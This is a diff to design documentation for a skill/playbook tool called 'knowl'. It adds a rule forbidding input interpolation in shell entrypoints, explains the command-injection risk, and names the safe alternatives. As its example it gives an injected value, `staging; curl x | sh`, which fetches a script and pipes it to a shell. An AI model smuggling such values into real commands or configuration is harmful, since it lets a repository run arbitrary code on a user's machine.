@@ -1872,6 +1872,8 @@ An unbound global skill lists and reads, but refuses to run until bound in proje
 
 **Interpolation is `${inputs.*}` and nothing else.** No environment variables, no shell expansions, and no arbitrary expressions. Any unresolved reference or command substitution syntax causes an immediate refusal before command execution.
 
+**A `shell` entrypoint cannot interpolate inputs at all.** It is a command *string*, so a bound value would be spliced into it as syntax rather than as a value -- `deploy ${inputs.target}` with `target` bound to `staging; curl x | sh` is two commands, and no quoting is correct for both `cmd.exe` and POSIX shells. That is the same reason a shell entrypoint already refuses runtime arguments, and it matters more for a binding, which comes from a *project's* config: without the rule, a repository could decide what an already-approved global playbook runs. Two routes remain, and the refusal names both. Read the value from `KNOWL_SKILL_INPUT_<NAME>` in the command -- every bound input is exported that way, and an environment value is read by the process rather than parsed by the shell that launched it -- or use a `script` entrypoint, whose arguments are passed as an array and never reach a shell. The example above is a script entrypoint for exactly this reason.
+
 Project bindings can also pin a version (e.g. `"version": 1`). If the playbook version increments, execution is refused until the pin is updated. Manifests also record `provenance` (`authored locally`, or imported source) which is shown in `knowl skill read`.
 
 #### Approval and trust
